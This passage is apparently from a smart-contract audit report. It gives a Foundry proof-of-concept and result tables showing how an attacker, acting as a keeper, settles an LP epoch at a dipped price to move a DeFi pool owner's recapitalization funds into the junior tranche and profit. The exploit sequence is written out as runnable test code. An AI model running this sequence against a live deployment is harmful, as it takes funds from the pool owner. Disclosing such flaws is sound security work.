        assertApproxEqAbs(a.jRec - c.jRec, clip, 1e6, "Junior principal gains the clipped U");
        // Owner's later documented assignment receives less by the clip.
        assertApproxEqAbs(c.assigned - a.assigned, clip, 1e6, "owner assignment short by the clip");
        // Users: Senior LP is unchanged (up to coupon dust); Junior LPs gain pro rata.
        assertApproxEqAbs(a.seniorUsdg, c.seniorUsdg, 1e6, "Senior LP payout changed by more than dust");
        assertGt(a.otherUsdg, c.otherUsdg, "other Junior LP did not gain");
        assertApproxEqAbs(a.traderBalances, c.traderBalances, 1e6, "trading legs must be identical in both branches");
        assertGt(a.attackerTotal, c.attackerTotal, "attacker did not gain");
        uint256 gain = a.attackerTotal - c.attackerTotal;
        assertGt(gain, (clip * 70) / 100, "attacker captured less than 70% of the clip");
    }

    // ------------------------------------------------------------------ scenario

    function _prefix() internal {
        _log("---------------- common prefix ----------------");
        // Owner (trusted, documented "Owner-funded recapitalization"): one recapitalizePool from its own wallet.
        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);
        // Any ordinary LP settlement applies the queued recap; Senior is at its HWM, so it all becomes unassigned.
        helperAUsdg = _exitAllNoPositions(juniorVault, HELPER_A);
        _logState("after recap + ordinary settlement");
        assertEq(pool.unassignedAssets(), RECAP, "recap did not land wholly in unassignedAssets");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "residual recap");
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark(), "Senior gap must be zero");

        // Attacker: interleaved hedge (skew cap), then the SHORT closes at entry; 999k LONG exposure remains.
        _fundTrader(ATK_LONG, TRADER_FUNDING);
        _fundTrader(ATK_SHORT, TRADER_FUNDING);
        for (uint256 i; i < CHUNKS; ++i) {
            _openChunk(ATK_LONG, CfdTypes.Side.LONG);
            _openChunk(ATK_SHORT, CfdTypes.Side.SHORT);
        }
        _closeLeg(ATK_SHORT, CfdTypes.Side.SHORT, ENTRY_PRICE);
        assertEq(_positionSize(ATK_LONG), CHUNK_SIZE * CHUNKS, "long leg");
        assertFalse(engine.degradedMode(), "hedge latched degraded mode");
        emit log_named_decimal_uint("LONG max liability L (USDG)", _maxLiability(), 6);
        emit log_named_decimal_uint("pool assets E (USDG)", pool.totalAssets(), 6);
        _logState("after attacker positions (VPI revenue reconciled later)");

        // Helper B queues its full 2 USDG Junior balance: a matured head gives the low-mark settlement progress.
        helperBShares = juniorVault.balanceOf(HELPER_B);
        vm.prank(HELPER_B);
        helperBRequest = juniorVault.requestRedeem(helperBShares, HELPER_B, HELPER_B);
    }

    function _branch(
        uint256 dipPrice,
        bool settleAtDip
    ) internal returns (Run memory r) {
        _log(settleAtDip ? "================ ATTACK branch ================" : "================ CONTROL branch ================");
        emit log_named_decimal_uint("lowest mark", dipPrice, 8);
        r.dipPrice = dipPrice;
        r.dipSettled = settleAtDip;
        _warpTo(pool.lpEpochStart(helperBRequest) + 60);

        // Down-leg: ordinary <= 1% public mark refreshes (the LONG gains, LP terminal equity falls).
        while (curPrice > dipPrice) {
            _markStep(curPrice - PRICE_STEP);
        }
        r.dDip = _distributable();
        emit log_named_decimal_uint("terminal distributable D at the lowest mark", r.dDip, 6);
        emit log_named_decimal_uint("stored U at the lowest mark", pool.unassignedAssets(), 6);
        if (settleAtDip) {
            // Attacker as a permissionless keeper: Router.settleLpEpoch with a valid PoolReconcile update at this mark.
            _nextBlock();
            bytes[] memory tick = _liveTick(curPrice);
            vm.prank(ATTACKER);
            router.settleLpEpoch(tick);
            emit log_named_uint(
                "helper head shares funded at the low mark (0 = refunded at zero NAV)",
                juniorVault.claimableRedeemRequest(helperBRequest, HELPER_B)
            );
        }
        r.sDip = pool.seniorPrincipal();
        r.jDip = pool.juniorPrincipal();
        r.hDip = pool.seniorHighWaterMark();
        r.uDip = pool.unassignedAssets();
        _logState(settleAtDip ? "after the LOW-MARK settlement" : "at the low mark (no reconcile)");

        // Final exits are requested at the same time in both branches.
        uint256 sReq = _requestAll(seniorVault, SENIOR_LP);
        uint256 aReq = _requestAll(juniorVault, ATTACKER);
        uint256 oReq = _requestAll(juniorVault, OTHER_JR);

        // Rebound to 1.00 in ordinary <= 1% marks; the attacker closes the LONG at entry.
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        while (curPrice < ENTRY_PRICE) {
            _markStep(curPrice + PRICE_STEP);
        }
        _closeLeg(ATK_LONG, CfdTypes.Side.LONG, ENTRY_PRICE);
        assertEq(_maxLiability(), 0, "positions remain");

        // Recovery reconcile + exits: one permissionless settlement (no open positions).
        _warpTo(pool.lpEpochStart(aReq) + 10);
        _refreshMark(curPrice);
        (r.previewS, r.previewJ,,) = pool.getPendingTrancheState();
        r.hBeforeRec = pool.seniorHighWaterMark();
        r.juniorSupplyRec = juniorVault.totalSupply();
        emit log_named_decimal_uint("terminal distributable D after the rebound", _distributable(), 6);
        vm.prank(KEEPER);
        IHousePool.LpEpochSettlementResult memory res = pool.settleLpEpoch(0, 0);
        r.sRec = pool.seniorPrincipal() + res.seniorFundedAssets;
        r.jRec = pool.juniorPrincipal() + res.juniorFundedAssets;
        r.uRec = pool.unassignedAssets();
        emit log_named_decimal_uint("recovery reconcile: Senior principal", r.sRec, 6);
        emit log_named_decimal_uint("recovery reconcile: Senior HWM (stored before)", r.hBeforeRec, 6);
        emit log_named_decimal_uint("recovery reconcile: Junior principal", r.jRec, 6);
        emit log_named_decimal_uint("recovery reconcile: unassigned U", r.uRec, 6);

        r.seniorUsdg = _claimAll(seniorVault, SENIOR_LP, sReq);
        r.attackerUsdg = _claimAll(juniorVault, ATTACKER, aReq);
        r.otherUsdg = _claimAll(juniorVault, OTHER_JR, oReq);
        uint256 hbClaimable = juniorVault.claimableRedeemRequest(helperBRequest, HELPER_B);
        if (hbClaimable > 0) {
            r.helperBValue = _claimShares(juniorVault, HELPER_B, helperBRequest, hbClaimable);
        }
        // Refunded (unfunded) helper shares are valued at the recovery-reconcile Junior price.
        r.helperBValue += ((helperBShares - hbClaimable) * r.jRec) / r.juniorSupplyRec;
        r.traderBalances = clearinghouse.balanceAssets(ATK_LONG) + clearinghouse.balanceAssets(ATK_SHORT)
            + engine.traderClaimBalanceAssets(ATK_LONG) + engine.traderClaimBalanceAssets(ATK_SHORT);
        r.attackerTotal = r.attackerUsdg + helperAUsdg + r.helperBValue + r.traderBalances;

        // Owner (trusted, documented): assign the ownerless remainder to a receiver of its choice.
        uint256 jBefore = pool.juniorPrincipal();
        pool.assignUnassignedAssets(false, OWNER_RECEIVER);
        r.assigned = pool.juniorPrincipal() - jBefore;
        emit log_named_decimal_uint("owner assignUnassignedAssets amount", r.assigned, 6);
    }

    function _report(
        Run memory a,
        Run memory c
    ) internal {
        uint256 attackerIn = ATTACKER_JUNIOR + HELPER_A_JUNIOR + HELPER_B_JUNIOR + 2 * TRADER_FUNDING;
        _log("==================== SUMMARY (one snapshot; CONTROL vs ATTACK) ====================");
        emit log_named_decimal_uint("lowest mark", a.dipPrice, 8);
        emit log_named_decimal_uint("D at the lowest mark", a.dDip, 6);
        emit log_named_decimal_uint("U before (owner recap remainder)", RECAP, 6);
        emit log_named_decimal_uint("ATTACK  U after low-mark settle", a.uDip, 6);
        emit log_named_decimal_uint("ATTACK  S / J after low-mark settle: S", a.sDip, 6);
        emit log_named_decimal_uint("ATTACK  S / J after low-mark settle: J", a.jDip, 6);
        emit log_named_decimal_uint("ATTACK  HWM after low-mark settle", a.hDip, 6);
        emit log_named_decimal_uint("CONTROL U after recovery", c.uRec, 6);
        emit log_named_decimal_uint("ATTACK  U after recovery", a.uRec, 6);
        emit log_named_decimal_uint("CONTROL S after recovery", c.sRec, 6);
        emit log_named_decimal_uint("ATTACK  S after recovery", a.sRec, 6);
        emit log_named_decimal_uint("CONTROL J after recovery", c.jRec, 6);
        emit log_named_decimal_uint("ATTACK  J after recovery", a.jRec, 6);
        emit log_named_decimal_uint("CONTROL owner assigned", c.assigned, 6);
        emit log_named_decimal_uint("ATTACK  owner assigned", a.assigned, 6);
        emit log_named_decimal_uint("CONTROL Senior LP USDG", c.seniorUsdg, 6);
        emit log_named_decimal_uint("ATTACK  Senior LP USDG", a.seniorUsdg, 6);
        emit log_named_decimal_uint("CONTROL other Junior LP USDG", c.otherUsdg, 6);
        emit log_named_decimal_uint("ATTACK  other Junior LP USDG", a.otherUsdg, 6);
        emit log_named_decimal_uint("CONTROL attacker Junior USDG", c.attackerUsdg, 6);
        emit log_named_decimal_uint("ATTACK  attacker Junior USDG", a.attackerUsdg, 6);
        emit log_named_decimal_uint("CONTROL attacker total (LP + helpers + trading accounts)", c.attackerTotal, 6);
        emit log_named_decimal_uint("ATTACK  attacker total (LP + helpers + trading accounts)", a.attackerTotal, 6);
        emit log_named_decimal_uint("CONTROL attacker trading accounts (after both closes)", c.traderBalances, 6);
        emit log_named_decimal_uint("ATTACK  attacker trading accounts (after both closes)", a.traderBalances, 6);
        emit log_named_decimal_uint("CONTROL helper B value", c.helperBValue, 6);
        emit log_named_decimal_uint("ATTACK  helper B value", a.helperBValue, 6);
        emit log_named_decimal_uint("attacker total put in", attackerIn, 6);
        emit log_named_decimal_int(
            "CONTROL attacker net PnL", int256(c.attackerTotal) - int256(attackerIn), 6
        );
        emit log_named_decimal_int("ATTACK  attacker net PnL", int256(a.attackerTotal) - int256(attackerIn), 6);
        if (RECAP > a.uRec) {
            emit log_named_decimal_uint("CLIPPED U (owner recap moved to tranches)", RECAP - a.uRec, 6);
            if (a.attackerTotal > c.attackerTotal) {
                emit log_named_decimal_uint(
                    "attacker share of the clipped U (%)", ((a.attackerTotal - c.attackerTotal) * 10_000) / (RECAP - a.uRec), 2
                );
            }
        }
        emit log_named_decimal_int(
            "OWNER LOSS (control assigned - attack assigned)", int256(c.assigned) - int256(a.assigned), 6
        );
        emit log_named_decimal_int(
            "ATTACKER GAIN (attack total - control total)", int256(a.attackerTotal) - int256(c.attackerTotal), 6
        );
        emit log_named_decimal_int(
            "OTHER JUNIOR LP GAIN", int256(a.otherUsdg) - int256(c.otherUsdg), 6
        );
        emit log_named_decimal_int(
            "SENIOR LP DIFFERENCE (attack - control)", int256(a.seniorUsdg) - int256(c.seniorUsdg), 6
        );
    }

    // ------------------------------------------------------------------ LP helpers (public paths)

    function _distributable() internal view returns (uint256) {
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory s =
            engineProtocolLens.getHousePoolInputSnapshot(pool.markStalenessLimit());
        return HousePoolAccountingLib.buildReconcileSnapshot(s).distributable;
    }

    function _exitAllNoPositions(
        TrancheVault vault,
        address wallet
    ) internal returns (uint256 usdg) {
        uint256 requestId = _requestAll(vault, wallet);
        _warpTo(pool.lpEpochStart(requestId) + 10);
        _refreshMark(curPrice);
        vm.prank(KEEPER);
        pool.settleLpEpoch(0, 0);
        usdg = _claimAll(vault, wallet, requestId);
    }

    function _requestAll(
        TrancheVault vault,
        address wallet
    ) internal returns (uint256 requestId) {
        uint256 shares = vault.balanceOf(wallet);
        vm.prank(wallet);
        requestId = vault.requestRedeem(shares, wallet, wallet);
    }

    function _claimAll(
        TrancheVault vault,
        address wallet,
        uint256 requestId
    ) internal returns (uint256 usdg) {
        uint256 claimable = vault.claimableRedeemRequest(requestId, wallet);
        assertGt(claimable, 0, "redemption not funded");
        usdg = _claimShares(vault, wallet, requestId, claimable);
    }

    function _claimShares(
        TrancheVault vault,
        address wallet,
        uint256 requestId,
        uint256 shares
    ) internal returns (uint256 usdg) {
        uint256 b0 = settlementToken.balanceOf(wallet);
        vm.prank(wallet);
        vault.claimRedeem(requestId, shares, wallet, wallet);
        usdg = settlementToken.balanceOf(wallet) - b0;
    }

    function _requestDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(
        TrancheVault vault,
        address lp,
        uint256 requestId
    ) internal {
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        assertGt(claimable, 0, "deposit not activated");
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _logState(
        string memory tag
    ) internal {
        _log(string.concat("-- ", tag));
        emit log_named_decimal_uint("   Senior principal", pool.seniorPrincipal(), 6);
        emit log_named_decimal_uint("   Senior HWM", pool.seniorHighWaterMark(), 6);
        emit log_named_decimal_uint("   Junior principal", pool.juniorPrincipal(), 6);
        emit log_named_decimal_uint("   unassigned U", pool.unassignedAssets(), 6);
        emit log_named_decimal_uint("   pending revenue bucket", pool.pendingTradingRevenueAssets(), 6);
    }

    function _log(
        string memory s
    ) internal {
        emit log(s);
    }

    // ------------------------------------------------------------------ trading / oracle helpers (public Router path)

    function _markStep(
        uint256 price
    ) internal {
        vm.warp(vm.getBlockTimestamp() + STEP_SECONDS);
        curPrice = price;
        _refreshMark(price);
    }

    function _openChunk(
        address account,
        CfdTypes.Side side
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("open", account, ++orderNonce));
        request.side = side;
        request.sizeDelta = CHUNK_SIZE;
        request.marginDelta = CHUNK_MARGIN;
        request.targetPrice = side == CfdTypes.Side.LONG ? 1 : engine.CAP_PRICE();
        request.isClose = false;
        request.bounds = _bounds();
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory result = _executeAt(KEEPER, orderId, ENTRY_PRICE);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open failed");
        _refreshMark(ENTRY_PRICE);
    }

    function _closeLeg(
        address account,
        CfdTypes.Side side,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("close", account, ++orderNonce));
        request.side = side;
        request.sizeDelta = _positionSize(account);
        request.marginDelta = 0;
        request.targetPrice = side == CfdTypes.Side.LONG ? engine.CAP_PRICE() : 1;
        request.isClose = true;
        request.bounds = _bounds();
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory result = _executeAt(account, orderId, price);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close failed");
        assertEq(_positionSize(account), 0, "leg not closed");
    }

    function _applyReleaseRouterConfig() internal {
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.maxExecutionWindowSeconds = 60;
        config.orderExecutionStalenessLimit = 60;
        config.liquidationStalenessLimit = 15;
        config.basketMaxConfidenceRatioBps = 10;
        config.orderSettlementWindow = 15;
        config.maxComponentPublishTimeDivergence = 5;
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        config.openOrderExecutionBountyBps = 1;
        config.minOpenOrderExecutionBountyAssets = 10_000;
        config.maxOpenOrderExecutionBountyAssets = 200_000;
        config.positionProtectionTriggerBountyAssets = 200_000;
        config.maxPendingOrders = 5;
        config.minEngineGas = 600_000;
        config.maxPruneOrdersPerCall = 64;
        _setRouterConfig(config);
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory bounds) {
        bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _executeAt(
        address keeper,
        uint64 orderId,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint64 commitTime = router.lifecycleBook().orderTiming(orderId).commitTimestamp;
        uint256 publishTime = uint256(commitTime) + 1;
        if (vm.getBlockTimestamp() < publishTime) {
            vm.warp(publishTime);
        }
        _nextBlock();
        bytes[] memory tick = _ticks(price, publishTime, commitTime);
        vm.prank(keeper);
        result = router.executeOrder(orderId, tick);
    }

    function _liveTick(
        uint256 price
    ) internal view returns (bytes[] memory) {
        return _ticks(price, vm.getBlockTimestamp(), engine.lastMarkTime());
    }

    function _ticks(
        uint256 price,
        uint256 publishTime,
        uint256 previousPublishTime
    ) internal pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, previousPublishTime)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        _nextBlock();
        router.updateMarkPrice(_liveTick(price));
    }

    function _nextBlock() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _warpTo(
        uint256 t
    ) internal {
        if (vm.getBlockTimestamp() < t) {
            vm.warp(t);
        }
    }

    function _positionSize(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

}
```

</details>

### Observed balances:

2 % dip (`test_Attack_TwoPercentDipSettlementMovesRecapitalizationIntoJunior`), both runs from one snapshot:

| Measurement (USDG) | Control: no low-mark settlement | Attack: settlement at 0.98 | Difference |
| --- | ---: | ---: | ---: |
| Terminal distributable D at 0.98 | 995,341.236707 | 995,341.236707 | 0 |
| U after the low mark | 1,000,000.000000 | 995,341.236707 | -4,658.763293 |
| Senior / Junior principal after the low mark | 5,001.093021 / 4,980.907345 (not reconciled) | 0.000000 / 0.000000 | n/a |
| Senior principal after the rebound reconcile | 5,001.215523 | 5,001.154576 | -0.060947 |
| Junior principal after the rebound reconcile | 9,086.303336 | 13,745.128961 | +4,658.825625 |
| U after the rebound reconcile | 1,000,000.000000 | 995,341.236707 | -4,658.763293 |
| Owner `assignUnassignedAssets` amount | 1,000,000.000000 | 995,341.236707 | **-4,658.763293** |
| Senior LP redemption | 5,000.213928 | 5,000.152993 | -0.060935 |
| Honest Junior LP redemption | 1,784.060914 | 2,698.803510 | +914.742596 |
| Attacker Junior redemption | 7,296.772655 | 11,038.051167 | +3,741.278512 |
| Attacker trading accounts after both closes | 155,094.081507 | 155,094.080122 | -0.001385 |
| Attacker total (LP + wallets + trading accounts) | 162,414.502182 | 166,157.649948 | **+3,743.147766** |
| Attacker net result on 164,022 USDG deposited | -1,607.497818 | +2,135.649948 | +3,743.147766 |
| Attacker share of the clipped U | n/a | 80.34 % | n/a |

3 % dip (`test_Attack_ThreePercentDipClipScalesWithMove`):

| Measurement (USDG) | Control | Attack: settlement at 0.97 | Difference |
| --- | ---: | ---: | ---: |
| Terminal distributable D at 0.97 | 985,351.236707 | 985,351.236707 | 0 |
| U after the rebound reconcile | 1,000,000.000000 | 985,351.236707 | -14,648.763293 |
| Junior principal after the rebound reconcile | 9,087.953775 | 23,736.787026 | +14,648.833251 |
| Owner `assignUnassignedAssets` amount | 1,000,000.000000 | 985,351.236707 | **-14,648.763293** |
| Senior LP redemption | 5,000.229175 | 5,000.160616 | -0.068559 |
| Honest Junior LP redemption | 1,784.384971 | 4,660.627363 | +2,876.242392 |
| Attacker total | 162,414.162544 | 174,183.815609 | **+11,769.653065** |
| Attacker net result on 164,022 USDG deposited | -1,607.837456 | +10,161.815609 | +11,769.653065 |
